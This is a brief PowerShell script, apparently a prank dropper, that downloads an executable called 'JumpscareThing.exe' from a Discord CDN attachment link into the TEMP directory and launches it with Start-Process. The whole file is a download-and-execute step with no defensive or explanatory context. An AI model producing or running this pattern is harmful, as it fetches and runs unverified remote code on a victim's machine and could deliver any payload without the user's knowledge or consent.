$url = "https://cdn.discordapp.com/attachments/860805946069745696/860806133328773130/JumpscareThing.exe"
$outpath = "$env:TEMP/JumpscareThing.exe"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $outpath)

$args = @("Comma","Separated","Arguments")
Start-Process -Filepath "$env:TEMP/JumpscareThing.exe" -ArgumentList $args
